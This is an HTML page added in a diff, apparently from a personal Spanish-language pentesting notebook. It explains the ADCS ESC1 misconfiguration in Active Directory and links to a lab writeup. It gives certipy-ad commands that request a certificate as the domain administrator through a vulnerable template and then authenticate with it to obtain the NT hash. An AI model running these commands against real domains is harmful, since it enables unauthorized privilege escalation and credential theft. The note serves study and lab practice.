@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>ESC1 | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="esc1">
+          <div class="note-tabbar">
+            <span>ESC1</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ADCS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / adcs</p>
+            <h2>ESC1</h2>
+
+            <p>ESC1 aparece cuando una plantilla permite enrollee-supplied subject y autenticación de cliente con permisos de enrolamiento aprovechables.</p>
+
+            <h2>Enrollee_Supplies_Subject + Client Authentication + Enrollment Permissions</h2>
+            <p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication">ESC1 PoC</a></p>
+            <section class="code-card">
+              <h3>Solicitar un certificado como cualquier usuario del dominio y autenticarse vía PKINIT obteniendo su NT hash</h3>
+              <pre><code># Solicitar Certificado como Administrator: Se genera administrator.pfx
+certipy-ad req -u &lt;user&gt;@&lt;domain.local&gt; -p &lt;pass&gt; -ca &lt;ca_name&gt; -template &lt;template_name&gt; -upn administrator@&lt;domain.local&gt; -dc-ip &lt;dc_ip&gt;
+
+# Autenticarse con el Certificado
+certipy-ad auth -pfx administrator.pfx -domain &lt;domain.local&gt; -dc-ip &lt;dc_ip&gt;
+
+# ENROLL Domain\Computers: Máquina Authority
+# Error -&gt; KDC_ERR_PADATA_TYPE_NOSUPP: Máquina Authority (acceder a LDAP shell)</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=authority">Authority</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>adcs</span>
+              <span>esc1</span>
+              <span>certipy</span>
+              <span>pfx</span>
+              <span>certificaciones</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
